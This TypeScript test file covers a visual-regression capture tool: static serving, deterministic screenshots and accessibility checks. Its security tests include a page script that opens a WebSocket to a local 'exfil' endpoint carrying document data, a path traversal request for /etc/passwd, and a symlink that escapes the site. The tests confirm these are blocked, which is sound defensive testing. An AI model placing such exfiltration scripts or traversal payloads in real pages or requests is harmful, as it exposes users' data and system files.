import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import type { VisualConfig } from '@design-warden/core';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { captureAll, serveStatic } from '../src/capture.ts';
import { compareCaptures } from '../src/index.ts';

// A tiny app that would be nondeterministic without the capture preset:
// it renders the current time, a random number, an animation, and an external image.
const HTML = `<!doctype html><html><head><style>
  body { font-family: sans-serif; margin: 0; padding: 16px; }
  .spin { width: 20px; height: 20px; background: #2563eb; animation: spin 1s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style></head><body>
  <main><h1 class="title">Home</h1><p id="now"></p><p id="rnd"></p><div class="spin"></div>
  <img src="https://example.com/tracker.png" alt=""><button id="b" onclick="document.body.dataset.clicked = 'yes'; document.getElementById('now').textContent += ' clicked'">Go</button></main>
  <script>
    document.getElementById('now').textContent = new Date().toISOString();
    document.getElementById('rnd').textContent = String(Math.random());
  </script>
</body></html>`;

const visual: VisualConfig = {
  viewports: [{ id: 'desktop', width: 640, height: 400 }],
  routes: [
    {
      id: 'home',
      path: '/',
      states: [
        { id: 'default', actions: [], waitFor: 'main h1' },
        { id: 'clicked', actions: [{ click: '#b' }], waitFor: 'body[data-clicked=yes]' },
        { id: 'missing', actions: [], waitFor: '#does-not-exist' },
      ],
    },
  ],
  mask: [],
};

let site: string;
let server: Awaited<ReturnType<typeof serveStatic>>;
beforeAll(async () => {
  site = fs.mkdtempSync(path.join(os.tmpdir(), 'dw-site-'));
  fs.writeFileSync(path.join(site, 'index.html'), HTML);
  server = await serveStatic(site);
});
afterAll(() => server?.close());

describe('serveStatic', () => {
  // VitePress trial: /guide/getting-started got the home page, so its state timed out (a spurious review request).
  it('serves clean URLs and folder indexes of static sites, and the app shell for other routes', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dw-clean-'));
    fs.mkdirSync(path.join(dir, 'guide'));
    fs.mkdirSync(path.join(dir, 'docs'));
    fs.writeFileSync(path.join(dir, 'index.html'), 'home');
    fs.writeFileSync(path.join(dir, 'guide', 'getting-started.html'), 'getting started');
    fs.writeFileSync(path.join(dir, 'docs', 'index.html'), 'docs');
    const s = await serveStatic(dir);
    try {
      const get = async (p: string) => (await fetch(`${s.url}${p}`)).text();
      expect(await Promise.all(['/guide/getting-started', '/docs/', '/docs', '/orders/42'].map(get))).toEqual(['getting started', 'docs', 'docs', 'home']);
    } finally {
      await s.close();
    }
  });

  it('refuses a clean-URL candidate that links outside the site', async () => {
    // /sub/page does not exist, but sub/page.html does, through a folder link that leaves the site.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dw-link-'));
    const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'dw-secret-'));
    fs.writeFileSync(path.join(dir, 'index.html'), 'home');
    fs.writeFileSync(path.join(outside, 'page.html'), 'secret');
    fs.symlinkSync(outside, path.join(dir, 'sub'), 'junction'); // a junction needs no extra rights on Windows
    const s = await serveStatic(dir);
    try {
      const r = await fetch(`${s.url}/sub/page`);
      expect([r.status, await r.text()]).toEqual([400, '']);
    } finally {
      await s.close();
    }
  });
});

describe('captureAll (real Chromium)', () => {
  it('produces byte-identical captures across runs, with frozen time and blocked external requests', async () => {
    const [a, b] = [fs.mkdtempSync(path.join(os.tmpdir(), 'dw-a-')), fs.mkdtempSync(path.join(os.tmpdir(), 'dw-b-'))];
    const m1 = await captureAll({ baseUrl: server.url, visual, outDir: a });
    await captureAll({ baseUrl: server.url, visual, outDir: b });

    const ok = m1.captures.filter((c) => !c.error);
    expect(ok.map((c) => c.id)).toEqual(['home/default/desktop', 'home/clicked/desktop']);
    for (const c of ok) expect(fs.readFileSync(path.join(a, c.file!)).equals(fs.readFileSync(path.join(b, c.file!)))).toBe(true);
    expect(m1.captures.find((c) => c.id === 'home/missing/desktop')?.error).toMatch(/does-not-exist/);
    expect(m1.captures[0]!.elements?.some((e) => e.label === 'h1.title')).toBe(true);
    expect(m1.fingerprint).toMatchObject({ headless: true, deviceScaleFactor: 1 });

    const { diffs } = await compareCaptures({ baseDir: a, headDir: b, artifactDir: fs.mkdtempSync(path.join(os.tmpdir(), 'dw-art-')), ruleId: 'v', options: { threshold: 0.02, cellSize: 8, minCellPixels: 4, minRegionPixels: 24 } });
    expect(diffs.filter((d) => d.status !== 'error').every((d) => d.status === 'unchanged')).toBe(true);
  }, 120_000);

  it('blocks WebSocket connections to other hosts (security review 2026-10-10)', async () => {
    // A second local server on another port stands in for an exfiltration endpoint.
    let attempted = false;
    const sink = http.createServer();
    sink.on('upgrade', (_req, socket) => {
      attempted = true;
      socket.destroy();
    });
    await new Promise<void>((r) => sink.listen(0, '127.0.0.1', () => r()));
    const port = (sink.address() as { port: number }).port;
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dw-ws-'));
    fs.writeFileSync(
      path.join(dir, 'index.html'),
      `<!doctype html><main><h1>WS</h1></main><script>const w = new WebSocket('ws://127.0.0.1:${port}/exfil?d=' + document.title);
       w.onclose = w.onerror = () => { document.body.dataset.done = 'yes'; };</script>`,
    );
    const site2 = await serveStatic(dir);
    try {
      const v: VisualConfig = { viewports: [{ id: 'd', width: 400, height: 300 }], routes: [{ id: 'r', path: '/', states: [{ id: 's', actions: [], waitFor: 'body[data-done=yes]' }] }], mask: [] };
      const m = await captureAll({ baseUrl: site2.url, visual: v, outDir: fs.mkdtempSync(path.join(os.tmpdir(), 'dw-wsout-')) });
      expect(m.captures[0]?.error).toBeUndefined();
      expect(attempted).toBe(false);
    } finally {
      await site2.close();
      sink.close();
    }
  }, 60_000);

  it('runs axe-core from node_modules on each captured state when asked, without network access', async () => {
    const m = await captureAll({ baseUrl: server.url, visual, outDir: fs.mkdtempSync(path.join(os.tmpdir(), 'dw-axe-')), accessibility: { tags: ['wcag2a'] } });
    const home = m.captures.find((c) => c.id === 'home/default/desktop')!;
    // The test page has no <title> and no lang attribute.
    expect(home.accessibility?.map((v) => v.rule).sort()).toEqual(['document-title', 'html-has-lang']);
    expect(home.accessibility?.find((v) => v.rule === 'html-has-lang')).toMatchObject({ impact: 'serious', nodes: [{ target: 'html', html: expect.stringMatching(/^<html/) }] });
    expect(home.file).toBeDefined(); // the screenshot is unaffected
  }, 120_000);

  it('serves files only from inside the served directory', async () => {
    const res = await fetch(`${server.url}/..%2f..%2fetc%2fpasswd`);
    expect(res.status).toBe(400);
  });
});
